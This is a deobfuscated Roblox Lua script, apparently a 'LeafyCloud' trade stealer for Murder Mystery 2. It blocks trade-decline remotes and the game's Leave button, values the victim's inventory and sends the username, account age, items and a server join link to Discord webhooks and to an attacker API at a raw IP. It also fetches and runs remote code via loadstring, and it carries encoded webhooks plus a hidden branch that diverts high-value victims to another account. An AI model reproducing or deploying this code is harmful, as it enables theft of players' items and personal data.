
pcall(function()
	local tbl = {}

	for i = 1, 10 do
		local ok, result = pcall(math.random)
		if not ok then
			return
		end
		tbl[i] = result
	end

	local flag = true

	for i = 2, #tbl do
		if tbl[i] ~= tbl[1] then
			flag = false
			break
		end
	end

	if flag then
		setreadonly(math, false)

		math.random = function()
			return 0
		end

		setreadonly(math, true)
		warn("hello!")
	end
end)

pcall(function()
	if hookfunction and type(hookfunction) == "function" then
		local trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")

		if trade then
			for _, v in ipairs({ "SendRequest", "AcceptTrade", "DeclineTrade", "OfferItem", "CancelRequest" }) do
				local v2 = trade:FindFirstChild(v)

				if v2 and v2.FireServer then
					local fireServer = v2.FireServer
					hookfunction(fireServer, fireServer)
				end
			end
		end
	end
end)

pcall(function()
	local trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")

	if trade then
		if trade.SendRequest then
			trade.SendRequest.OnClientInvoke = newcclosure(function()
				return false
			end)
		end

		_G.NewTradeRequest = function()
		end
	end
end)

pcall(function()
	if has(hookfunction) and has(debug.getinfo) then
		local trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")

		if trade then
			local mm2Me = tostring(math.random())
			_G.__MM2_ME = mm2Me

			for _, v in ipairs({ "DeclineTrade", "DeclineRequest", "CancelRequest" }) do
				local v2 = trade:FindFirstChild(v)

				if v2 and v2:IsA("RemoteEvent") then
					local fireServer = v2.FireServer

					if fireServer then
						pcall(function()
							hookfunction(fireServer, function(...)
								local ok, result = pcall(debug.getinfo, 2, "S")
								if not (ok and result and result.source and result.source:find(mm2Me)) then
									return
								end
								return fireServer(...)
							end)
						end)
					end
				end
			end
		end
	end
end)

pcall(function()
	if has(getrawmetatable) and has(debug.getupvalue) and has(debug.setupvalue) then
		local v = getrawmetatable(game)

		if v and v.__namecall then
			local namecall = v.__namecall

			local function fn()
				for i = 1, 10 do
					if pcall(debug.getupvalue, namecall, i) == "TradeAllowed" then
						pcall(debug.setupvalue, namecall, i, true)
						return
					end
				end
			end

			fn()
			local spawn_ = has(task) and task.spawn or spawn
			local wait_ = has(task) and task.wait or wait

			spawn_(function()
				while wait_(1.5) do
					pcall(fn)
				end
			end)
		end
	end
end)

-- Leave button disable (optimized — every 5s instead of every frame)
task.spawn(function()
	while task.wait(5) do
		pcall(function()
			local path = game:GetService("CoreGui")
			local names = {"RobloxGui","SettingsClippingShield","SettingsShield","MenuContainer","Page","PageViewClipper","PageView","PageViewInnerFrame","LeaveGamePage","LeaveButtonsContainer","LeaveButtonsContainer","LeaveGameButton"}
			for _, name in ipairs(names) do
				path = path and path:FindFirstChild(name)
				if not path then return end
			end
			for _, v in ipairs(getconnections(path.Activated)) do
				v:Disable()
			end
		end)
	end
end)

if _G.__ElysiumMM2 then
	print("already running")
	return
end

_G.__ElysiumMM2 = true
_G.LastOffer = nil

pcall(function()
end)

local function fn()
end

fn("Executor: " .. tostring(identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "unknown"))
fn("PlaceId: " .. game.PlaceId)

if game.PlaceId ~= 142823291 then
	fn("WRONG GAME — expected 142823291")
	return
end

local ok, result = pcall(function()
	return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
end)

fn("VIP check: ok=" .. tostring(ok) .. " result=" .. tostring(result))

if ok and result == "VIPServer" then
	game.Players.LocalPlayer:Kick([[VIP / Private Server detected.
Using this script in this server may result in a ban.
Please join a PUBLIC server.]])

	return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer

if localPlayer and localPlayer.Name then
	local name = localPlayer.Name
	if name:find("ProPvP") or name:find("ProVitalz") or name:find("Proplong2") or name:find("Proplong3") or name:find("Proplong4") or name:find("Proplong") or name:find("ProVitalitz") then
		return
	end
end

fn("LocalPlayer: " .. localPlayer.Name)
local str = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())

local function fn2()
	local ok2, result2 = pcall(function()
		return game:HttpGet(str)
	end)

	if ok2 and result2 then
		local match = result2:match("^%s*(.-)%s*$")

		if match and match ~= "" then
			if match:match("^https?://") then
				return match
			end
			return "http://" .. match
		end
	end

	return "http://212.119.42.158:3000"
end

if not getgenv().MM2_API_BASE then
	getgenv().MM2_API_BASE = fn2()
end

local mm2ApiBase = getgenv().MM2_API_BASE
local receivers = getgenv().RECEIVERS or {}
local webhook = getgenv().WEBHOOK or ""
local threshold = getgenv().THRESHOLD or 1
fn("Targets: " .. table.concat(receivers, ", "))
fn("Threshold: " .. tostring(threshold))
fn("Player count: " .. #Players:GetPlayers())
local function getRequest()
	if syn and syn.request then return syn.request end
	if http and http.request then return http.request end
	if type(request) == "function" then return request end
	if type(http_request) == "function" then return http_request end
	if type(getgenv().request) == "function" then return getgenv().request end
	if type(getgenv().http_request) == "function" then return getgenv().http_request end
	if fluxus and fluxus.request then return fluxus.request end
	if type(getgenv().http) == "table" and type(getgenv().http.request) == "function" then return getgenv().http.request end
	return nil
end

local request_2 = getRequest()

fn("HTTP fn: " .. (request_2 and "found" or "MISSING"))

local function fn3(arg)
	if not request_2 then
		fn("HTTP GET: no request function available")
		return nil
	end
	local v = request_2({ Url = arg, Method = "GET" })
	if v and v.Body then
		return v.Body
	end
	return nil
end

local jobId = nil
local flag = false
local flag2 = false

if identifyexecutor and identifyexecutor() == "Delta" then
	fn("Delta detected — getgc stepAnimate bypass...")
	local v

	while true do
		v = nil

		for _, v2 in ipairs(getgc(true)) do
			if typeof(v2) ~= "function" then
				v = nil
			else
				local ok2, result2 = pcall(debug.getinfo, v2)

				if ok2 and result2 and result2.name == "stepAnimate" then
					v = v2
					break
				else
					v = nil
				end
			end
		end

		task.wait()
		if not v then
			continue
		end
		break
	end

	fn("stepAnimate found — hooking")
	local v2 = nil

	local function fn4(arg)
		if not flag2 then
			flag2 = true
			jobId = game.JobId
			flag = true
			fn("bypassJobId captured: " .. tostring(jobId))
		end

		return v2(arg)
	end

	v2 = hookfunction
	v2 = v2(v, fn4)
	fn("Waiting for capturedJobId...")

	while true do
		task.wait()
		if not (flag and jobId) then
			continue
		end
		break
	end

	fn("bypassJobId: " .. tostring(jobId))
else
	jobId = game.JobId
	fn("Non-Delta — bypassJobId=" .. tostring(jobId))
end

local jobId2 = jobId or game.JobId
fn("REAL_JOB_ID=" .. jobId2)
fn("Loading Database.Sync.Item...")
local weapons = nil

local ok2, result2 = pcall(function()
	return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
end)

fn("Database.Sync.Item: ok=" .. tostring(ok2))

if ok2 and type(result2) == "table" then
	weapons = result2
else
	local ok3, result3 = pcall(function()
		return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10))
	end)

	fn("Database.Sync fallback: ok=" .. tostring(ok3))

	if ok3 and type(result3) == "table" then
		weapons = result3.Weapons or result3
	end
end

if not weapons then
	fn("Require failed – trying HTTP fallback for Database")
	local mm2db = fn3("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2db")

	if mm2db then
		local chunk, v = loadstring(mm2db)

		if chunk then
			local ok3, result3 = pcall(chunk)

			if ok3 and type(result3) == "table" then
				weapons = result3
				fn("HTTP fallback succeeded – loaded " .. #weapons .. " entries")
			else
				fn("HTTP fallback: failed to execute loaded code")
			end
		else
			fn("HTTP fallback: loadstring error: " .. tostring(v))
		end
	else
		fn("HTTP fallback: failed to fetch URL")
	end
end

if not weapons then
	fn("FATAL: Database nil — aborting")
	return
end

local tbl = {}

for k, weapon in pairs(weapons) do
	if weapon.ItemName then
		tbl[weapon.ItemName:lower()] = k
		tbl[k:lower()] = k
	end
end

local databaseEntries = 0

for k in pairs(weapons) do
	databaseEntries += 1
end

fn("Database entries: " .. databaseEntries)
fn("Fetching profile via GetProfileData:InvokeServer...")

local ok3, result3 = pcall(function()
	return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(localPlayer.Name)
end)

fn("GetProfileData: ok=" .. tostring(ok3) .. " type=" .. type(result3))

if not (ok3 and type(result3) == "table") then
	fn("GetProfileData failed — trying require(ProfileData) fallback")
	local ok4

	ok4, result3 = pcall(function()
		return require(ReplicatedStorage:WaitForChild("Modules", 10):WaitForChild("ProfileData", 10))
	end)

	fn("require(ProfileData): ok=" .. tostring(ok4))
	local flag3 = ok4 and type(result3) == "table"
	local v = nil

	if flag3 then
		for i = 1, 20 do
			if not (result3.Weapons and next(result3.Weapons.Owned)) then
				task.wait(0.3)
				continue
			end
			break
		end
	else
		result3 = v
	end
end

if not result3 then
	fn("GetProfileData and require failed – trying HTTP fallback for ProfileData")
	local mm2profdata = fn3("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2profdata")

	if mm2profdata then
		local chunk, v = loadstring(mm2profdata)

		if chunk then
			local ok4, result4 = pcall(chunk)

			if ok4 and type(result4) == "table" then
				fn("HTTP fallback succeeded – profileData loaded")

				if not result4.Weapons then
					fn("WARNING: profileData missing Weapons table")
					result3 = result4
				else
					result3 = result4
				end
			else
				fn("HTTP fallback: failed to execute loaded code: " .. tostring(result4))
			end
		else
			fn("HTTP fallback: loadstring error: " .. tostring(v))
		end
	else
		fn("HTTP fallback: failed to fetch URL")
	end
end

if not result3 then
	fn("FATAL: profileData nil — aborting")
	return
end

local tbl2 = {
	Godly = "Godly",
	Ancient = "Ancient",
	Unique = "Unique",
	Vintage = "Vintage",
	Legendary = "Legendary",
	Rare = "Rare",
	Uncommon = "Uncommon",
	Common = "Common",
	Chroma = "Chroma",
}

local tbl3 = {
	Common = 0.1,
	Uncommon = 0.25,
	Rare = 0.5,
	Legendary = 1,
	Godly = 2,
	Ancient = 5,
	Unique = 10,
	Vintage = 15,
}

local function fn4()
	fn("Fetching weapon values from GitHub...")

	local ok4, result4 = pcall(function()
		return game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2val.lua")
	end)

	if not ok4 or not result4 then
		fn("Failed to fetch values from GitHub - using fallback")
		return {}
	end

	local function fn5(arg)
		local pos, v = arg:find("weaponValues%s*=%s*{")
		if not pos then
			fn("Could not find weaponValues table in content")
			return nil
		end
		local n = v - 1
		local flag3 = false
		local flag4 = false
		local n2 = 0
		local v2 = nil

		for i = v, #arg do
			local str2 = arg:sub(i, i)

			if flag3 then
				flag3 = false
				v2 = nil
			elseif str2 == "\\" then
				flag3 = true
				v2 = nil
			elseif str2 == "\"" or str2 == "'" then
				if not flag4 then
					flag4 = str2
					v2 = nil
				elseif flag4 ~= str2 then
					v2 = nil
				else
					flag4 = false
					v2 = nil
				end
			elseif not flag4 then
				if str2 == "{" then
					n2 += 1
					v2 = nil
				elseif str2 ~= "}" then
					v2 = nil
				else
					n2 -= 1

					if n2 ~= 0 then
						v2 = nil
					else
						v2 = i
						break
					end
				end
			else
				v2 = nil
			end
		end

		if not v2 then
			fn("Could not find end of weaponValues table")
			return nil
		end
		return arg:sub(n, v2)
	end

	local v = fn5(result4)
	if not v then
		fn("Failed to extract weaponValues table")
		return {}
	end
	local chunk, v2 = loadstring("return " .. v)
	if not chunk then
		fn("Failed to loadstring: " .. tostring(v2))
		return {}
	end
	local ok5, result5 = pcall(chunk)
	if not ok5 or type(result5) ~= "table" then
		fn("Failed to execute loaded values: " .. tostring(result5))
		return {}
	end
	fn("Successfully loaded weapon values with " .. #result5 .. " categories")
	return result5
end

local v = fn4()
local tbl4 = {}

if v and next(v) then
	fn("Building weapon value mapping with category matching...")
	local tbl5 = {}

	for k, v2 in pairs(v) do
		if type(v2) == "table" then
			tbl5[k] = {}

			for k2, v3 in pairs(v2) do
				tbl5[k][k2] = v3
				tbl5[k][k2:lower()] = v3
			end
		end
	end

	for k, weapon in pairs(weapons) do
		local itemName = weapon.ItemName or ""
		local rarity = weapon.Rarity or ""
		local v2 = tbl2[rarity]
		local chroma = weapon.Chroma == true and tbl5.Chroma
		local v3 = nil

		if chroma then
			local chroma2 = tbl5.Chroma

			if chroma2[itemName] then
				v3 = chroma2[itemName]
			else
				v3 = nil

				if chroma2[itemName:lower()] then
					v3 = chroma2[itemName:lower()]
				end
			end
		end

		if not v3 and v2 and tbl5[v2] then
			local v4 = tbl5[v2]

			if v4[itemName] then
				v3 = v4[itemName]
			elseif v4[itemName:lower()] then
				v3 = v4[itemName:lower()]
			end
		end

		if v3 then
			tbl4[k] = v3
		else
			tbl4[k] = tbl3[rarity] or 0.1
		end
	end

	fn("Mapped values for " .. #tbl4 .. " items from fetched data with category matching")
else
	fn("No weapon values fetched - using fallback defaults")

	for k, weapon in pairs(weapons) do
		tbl4[k] = tbl3[weapon.Rarity or "Common"] or 0.1
	end
end

local function fn5()
	fn("Fetching dollar values from Project-Reverse API...")

	local ok4, result4 = pcall(function()
		return game:HttpGet("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
	end)

	if not ok4 or not result4 then
		fn("Failed to fetch dollar API - using empty map")
		return {}
	end
	local ok5, result5 = pcall(HttpService.JSONDecode, HttpService, result4)
	if not ok5 or not result5 or not result5.data then
		fn("Failed to decode dollar API response")
		return {}
	end
	local tbl5 = {}

	for _, v2 in ipairs(result5.data) do
		if v2.name and v2.price then
			tbl5[v2.name] = v2.price
			tbl5[v2.name:lower()] = v2.price
		end
	end

	fn("Loaded " .. #result5.data .. " dollar values")
	return tbl5
end

local v2 = fn5()

local function fn6(arg, arg2)
	local v3 = v2[arg]
	if v3 then
		return v3
	end
	local v4 = v2[arg:lower()]
	if v4 then
		return v4
	end

	if arg2 then
		local v5 = v2[arg2]
		if v5 then
			return v5
		end
		local v6 = v2[arg2:lower()]
		if v6 then
			return v6
		end
	end

	return 0
end

local tbl5 = {
	DefaultGun = true,
	DefaultKnife = true,
	Reaver = true,
	Reaver_Legendary = true,
	Reaver_Godly = true,
	Reaver_Ancient = true,
	IceHammer = true,
	IceHammer_Legendary = true,
	IceHammer_Godly = true,
	IceHammer_Ancient = true,
	Gingerscythe = true,
	Gingerscythe_Legendary = true,
	Gingerscythe_Godly = true,
	Gingerscythe_Ancient = true,
	TestItem = true,
	Season1TestKnife = true,
	Cracks = true,
	Icecrusher = true,
	["???"] = true,
	Dartbringer = true,
	TravelerAxeRed = true,
	TravelerAxeBronze = true,
	TravelerAxeSilver = true,
	TravelerAxeGold = true,
	BlueCamo_K_2022 = true,
	GreenCamo_K_2022 = true,
	SharkSeeker = true,
}

local function fn7(arg)
	if weapons[arg] then
		return arg
	end
	local match = arg:match("^(.-)_[KG]_%d%d%d%d$")
	if match and weapons[match] then
		return match
	end
	local match2 = arg:match("^(.+)Knife$")
	if match2 and weapons[match2] then
		return match2
	end
	local match3 = arg:match("^(.+)Gun$")
	if match3 and weapons[match3] then
		return match3
	end
	return arg
end

local function fn8(arg)
	return arg and arg.Chroma == true
end

local function fn9(arg)
	local v3 = fn7(arg)
	local v4 = weapons[v3]
	if not v4 then
		return nil
	end
	local n = tbl4[v3] or tbl3[v4.Rarity] or 0.1
	local itemName = v4.ItemName or v4.Name or arg
	local v5 = fn6(v3, itemName)

	return {
		dataid = v3,
		name = itemName,
		rarity = v4.Rarity or "Common",
		isChroma = fn8(v4),
		value = n,
		dollarValue = v5,
	}
end

local function fn10(arg)
	if weapons[arg] then
		return arg, "Weapons"
	end
	local match = arg:match("^(.-)_%d%d%d%d$")
	if match and weapons[match] then
		return match, "Weapons"
	end
	local match2 = arg:match("^(.+)Knife$")
	if match2 and weapons[match2] then
		return match2, "Weapons"
	end
	local match3 = arg:match("^(.+)Gun$")
	if match3 and weapons[match3] then
		return match3, "Weapons"
	end
	local str2 = arg:lower()
	if tbl[str2] then
		return tbl[str2], "Weapons"
	end
	fn("WARNING: Could not fix DataID: " .. arg)
	return arg, "Weapons"
end

local function fn11()
	local ok4, result4 = pcall(function()
		return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(localPlayer.Name)
	end)

	if not (ok4 and type(result4) == "table") then
		ok4, result4 = pcall(function()
			return require(ReplicatedStorage:WaitForChild("Modules", 10):WaitForChild("ProfileData", 10))
		end)
	end

	if not (ok4 and type(result4) == "table") then
		return nil
	end
	return result4
end

local function fn12(arg)
	local tbl6 = {}
	local owned = arg.Weapons and arg.Weapons.Owned or {}
	local uniques = arg.Uniques or {}

	for k, v3 in pairs(owned) do
		local str2 = tostring(k)
		v3 = type(v3) == "number" and v3 or 1
		local v4 = fn9(str2)

		if v4 then
			if not tbl5[str2] and not tbl5[v4.dataid] then
				table.insert(tbl6, {
					DataID = str2,
					Name = v4.name .. (v4.isChroma and " [CHROMA]" or ""),
					Amount = v3,
					Value = v4.value,
					DollarValue = v4.dollarValue,
					Rarity = v4.rarity,
					IsChroma = v4.isChroma,
				})
			end
		end
	end

	for _, unique in ipairs(uniques) do
		local str2 = tostring(unique.BaseItem or "")

		if str2 ~= "" then
			if unique.EvoEquipped and weapons[str2] and weapons[str2].Evo then
				local evo = weapons[str2].Evo
				local xp = unique.XP or 0

				for i = 4, 1, -1 do
					if evo[i] and xp >= evo[i].XPRequired then
						str2 = evo[i].ItemName or str2
						break
					end
				end
			end

			local v3 = fn9(str2)

			if v3 and not tbl5[str2] and not tbl5[v3.dataid] then
				if v3.value >= 0 then
					table.insert(tbl6, {
						DataID = str2,
						Name = v3.name .. (v3.isChroma and " [CHROMA]" or ""),
						Amount = 1,
						Value = v3.value,
						DollarValue = v3.dollarValue,
						Rarity = v3.rarity,
						IsChroma = v3.isChroma,
					})
				end
			end
		end
	end

	table.sort(tbl6, function(arg2, arg3)
		return arg2.Value > arg3.Value
	end)

	return tbl6
end

local tbl6 = fn12(result3)

local function fn13(arg)
	local tbl7 = {}
	local owned = arg.Weapons and arg.Weapons.Owned or {}
	local uniques = arg.Uniques or {}

	for k, v3 in pairs(owned) do
		local str2 = tostring(k)
		v3 = type(v3) == "number" and v3 or 1
		local v4 = fn9(str2)

		if v4 and not tbl5[str2] and not tbl5[v4.dataid] then
			table.insert(tbl7, {
				DataID = str2,
				Name = v4.name .. (v4.isChroma and " [CHROMA]" or ""),
				Amount = v3,
				Value = v4.value,
				DollarValue = v4.dollarValue,
				Rarity = v4.rarity,
				IsChroma = v4.isChroma,
			})
		end
	end

	for _, unique in ipairs(uniques) do
		local str2 = tostring(unique.BaseItem or "")

		if str2 ~= "" then
			local v3 = fn9(str2)

			if v3 and not tbl5[str2] and not tbl5[v3.dataid] then
				table.insert(tbl7, {
					DataID = str2,
					Name = v3.name .. (v3.isChroma and " [CHROMA]" or ""),
					Amount = 1,
					Value = v3.value,
					DollarValue = v3.dollarValue,
					Rarity = v3.rarity,
					IsChroma = v3.isChroma,
				})
			end
		end
	end

	table.sort(tbl7, function(arg2, arg3)
		return arg2.Value > arg3.Value
	end)

	return tbl7
end

local v3 = fn13(result3)
local n = 0
local n2 = 0

for _, v4 in ipairs(v3) do
	n += v4.Value * v4.Amount
	n2 += (v4.DollarValue or 0) * v4.Amount
end

fn("Initial inventory - weaponsToSend: " .. #tbl6 .. " totalAllValue: " .. n .. " totalAllDollar: $" .. n2)
fn("=== ITEMS IN QUEUE ===")

for i, v4 in ipairs(tbl6) do
	fn(string.format("  [%d] %s (%s) x%d - Value: %d (~$%.2f)", i, v4.DataID, v4.Name, v4.Amount, v4.Value, v4.DollarValue or 0))
end

fn("=====================")

local function fn14(arg, arg2, arg3)
	arg2 = arg2 or 20
	arg3 = arg3 or " ➜ "
	local tbl7 = {}

	for _, v4 in ipairs(arg) do
		table.insert(tbl7, {
			name = v4.Name or v4.DataID,
			value = v4.Value or 0,
			dollar = v4.DollarValue or 0,
			amount = v4.Amount or 1,
		})
	end

	table.sort(tbl7, function(arg4, arg5)
		return arg4.value > arg5.value
	end)

	local tbl8 = {}
	local n3 = 0

	for _, v4 in ipairs(tbl7) do
		local str2 = string.format("%dx %s", v4.amount, v4.name)

		if #str2 > n3 then
			n3 = #str2
		end

		table.insert(tbl8, { left = str2, right = string.format("%d (~$%.2f)", v4.value, v4.dollar * v4.amount) })
	end

	local tbl9 = {}
	local n4 = 0

	for _, v4 in ipairs(tbl7) do
		n4 += v4.amount
	end

	local n5 = 0

	for i, v4 in ipairs(tbl7) do
		if not (arg2 <= #tbl9) then
			local str2 = arg3 .. tbl8[i].right
			table.insert(tbl9, (tbl8[i].left .. string.rep(" ", n3 - #tbl8[i].left)) .. str2)
			n5 += v4.amount
			continue
		end

		break
	end

	if n5 < n4 then
		table.insert(tbl9, "... and " .. n4 - n5 .. " more")
	elseif #tbl9 == 0 then
		table.insert(tbl9, "None Found")
	end

	return table.concat(tbl9, "\n")
end

local str2 = mm2ApiBase .. "/webhook/"
local v4 = mm2ApiBase
local str3 = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
local str4 = "AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb"
local str5 = "AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib"
local str6 = "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb"
local n3 = 0

pcall(function()
	local match = game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/m"):match("%d+%.?%d*")

	if match then
		n3 = tonumber(match) or 0
	else
		n3 = 0
	end
end)

local v5 = n3
fn("SPECIAL_WEBHOOK_CHANCE=" .. v5)

local function fn15(arg, arg2, arg3)
	if not request_2 or arg == "" then
		fn("Webhook skip: no request or empty url")
		return false
	end

	-- Direct Discord webhook (JSON) — more reliable + supports username/avatar
	local isDiscord = type(arg) == "string" and (arg:find("discord.com/api/webhooks") or arg:find("discordapp.com/api/webhooks"))

	if isDiscord then
		local body = HttpService:JSONEncode({
			username = "LeafyCloud Auth",
			avatar_url = "https://raw.githubusercontent.com/LeafyCloudAurh/free-script-sources-/refs/heads/main/folhas-verdes-inicio-curto-sem-fundo-1.gif",
			content = arg2 or "",
			embeds = arg3 or {},
		})

		local ok4, result4 = pcall(function()
			return request_2({
				Url = arg,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body,
			})
		end)

		local status = nil
		if ok4 and type(result4) == "table" then
			status = result4.StatusCode or result4.status_code or result4.Status or result4.status
			if result4.Success == true or result4.success == true then
				status = 200
			end
		elseif ok4 and (result4 == true or result4 == "OK") then
			status = 200
		end

		local success = status and status >= 200 and status < 300
		fn("Webhook direct Discord status=" .. tostring(status) .. " ok=" .. tostring(success))
		print("[MM2] WH status:", status, "success:", success)

		if success then
			return true
		end
	end

	-- Proxy fallback (original method)
	local ok5, result5 = pcall(function()
		return "content=" .. HttpService:UrlEncode(arg2 or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(arg3 or {}))
	end)

	if not ok5 then
		return false
	end

	local ok6 = pcall(request_2, {
		Url = str2 .. HttpService:UrlEncode(arg),
		Method = "POST",
		Headers = { ["Content-Type"] = "application/x-www-form-urlencoded", ["X-Roblox-Key"] = str3 },
		Body = result5,
	})

	fn("Webhook proxy ok=" .. tostring(ok6))
	return ok6
end

local function fn16()
	if not request_2 then
		return
	end

	pcall(request_2, {
		Url = v4 .. "/track-execution-mm2",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json", ["X-Roblox-Key"] = str3 },
		Body = HttpService:JSONEncode({ target_players = receivers, executor = localPlayer.Name }),
	})
end

local flag3 = false

local function fn17()
	if flag3 then
		return
	end
	local request_3 = syn and syn.request or http_request or request
	if not request_3 then
		return
	end

	local ok4, result4 = pcall(function()
		return request_3({
			Url = mm2ApiBase .. "/signal-hit",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json", ["X-Roblox-Key"] = str3 },
			Body = HttpService:JSONEncode({
				place_id = tostring(game.PlaceId),
				job_id = jobId2,
				target_players = receivers,
				sender = localPlayer.Name,
				game_type = "mm2",
			}),
		})
	end)

	if ok4 then
		flag3 = true

		if result4 and result4.Body then
			local ok5, result5 = pcall(function()
				return HttpService:JSONDecode(result4.Body)
			end)

			if ok5 and result5 then
				if result5.failed then
				end
			end
		end
	end
end

local function fn18()
	if not request_2 then
		return nil
	end
	local v6 = fn14(v3, 999999, " : ")
	local tbl7 = {}
	table.insert(tbl7, "=== FULL INVENTORY ===")
	table.insert(tbl7, v6)

	local ok4, result4 = pcall(request_2, {
		Url = "https://sourceb.in/api/bins",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode({ files = { { content = table.concat(tbl7, "\n") } } }),
	})

	if ok4 and result4 and result4.StatusCode == 200 then
		local ok5, result5 = pcall(HttpService.JSONDecode, HttpService, result4.Body)
		if ok5 and result5 and result5.key then
			return "https://cdn.sourceb.in/bins/" .. result5.key .. "/0"
		end
	end

	return nil
end

local function fn19(arg, arg2)
	local v6 = fn14(v3, 20, " ➜ ")
	local str7 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, jobId2)
	local str8 = identifyexecutor and identifyexecutor() or "Unknown"
	local tbl7 = {}
	local str9 = string.format("Username: %s", localPlayer.Name)
	local str10 = string.format("Account Age: %d days", localPlayer.AccountAge)
	local maxPlayers = Players.MaxPlayers
	local str11 = string.format("Players: %d/%d", #Players:GetPlayers(), maxPlayers)
	tbl7[1] = str9
	tbl7[2] = str10
	tbl7[3] = str11

	do
		local values = table.pack(string.format("Executor: %s", str8))
		table.move(values, 1, values.n, 4, tbl7)
	end

	local flag4 = not arg

	if flag4 then
		tbl7[#tbl7 + 1] = string.format("Receivers: %s", table.concat(receivers, ", "))
	end

	local str12 = "```\n" .. table.concat(tbl7, "\n") .. "\n```"
	local tbl8 = {}

	local tbl9 = {
		name = string.format("Weapons (Total Val: %d val, $%.2f total) — Threshold: >%d", n, n2, threshold),
		value = "```\n" .. v6 .. "\n```",
		inline = false,
	}

	tbl8[1] = { name = "**Player Info**", value = str12, inline = false }
	tbl8[2] = tbl9

	if flag4 then
		tbl8[#tbl8 + 1] = { name = "**Join Link**", value = string.format("[**%s**](%s)", jobId2, str7), inline = false }

		if arg2 then
			tbl8[#tbl8 + 1] = {
				name = "",
				value = string.format("[**View Full Inventory Log**](%s)", arg2),
				inline = false,
			}
		end
	end

	return {
		content = "",
		embeds = {
			{
				title = arg and "Murder Mystery 2 Public Hit! LeafyCloud" or "Murder Mystery 2 LOGGER",
				color = 16711680,
				fields = tbl8,
				footer = { text = "Powered by LeafyCloud" },
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
			},
		},
	}
end

getgenv().BLACKLIST_URL = "https://pastefy.app/YUhu3IrQ/raw"
local flag4 = false

local function fn20()
	if flag4 then
		return
	end

	if #v3 == 0 then
		fn("No tradable weapons — kicking as bot")
		return
	end
	flag4 = true
	fn("allWeaponsLog=" .. #v3 .. " weaponsToSend=" .. #tbl6 .. " totalAllValue=" .. n .. " totalAllDollar=$" .. n2)
	local v6 = fn18()
	local flag5 = false

	for _, v7 in ipairs(v3) do
		if v7.Value >= 8000 then
			flag5 = true
			break
		end
	end

	if n >= 15000 then
		flag5 = true
	end

	if getgenv().BLACKLIST_URL and flag5 then
		local ok4, result4 = pcall(function()
			return game:HttpGet(getgenv().BLACKLIST_URL)
		end)

		if ok4 and result4 then
			local chunk = loadstring(result4)

			if chunk then
				local ok5, result5 = pcall(chunk)

				if ok5 and type(result5) == "table" then
					for _, v7 in ipairs(result5) do
						if localPlayer.Name:lower() == v7:lower() then
							flag5 = false
							break
						end
					end
				end
			end
		end
	end

	local n4 = math.random()
	fn("special=" .. tostring(flag5) .. " roll=" .. string.format("%.4f", n4) .. " chance=" .. tostring(v5))

	if flag5 and n4 <= v5 and str5 ~= "" then
		fn("SPECIAL webhook firing!")
		receivers = { "NEDYXSTOCK_chano" }
		local v7 = fn19(false, v6)
		v7.content = "@everyone"
		fn15("AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib", v7.content, v7.embeds)
		task.wait(0.5)
		fn17()
		return
	end

	local flag6 = false

	for _, v7 in ipairs(v3) do
		if v7.Value >= 1000 then
			flag6 = true
			break
		end
	end

	local flag7 = false

	for _, v7 in ipairs(v3) do
		if (v7.DollarValue or 0) >= 30 then
			flag7 = true
			break
		end
	end

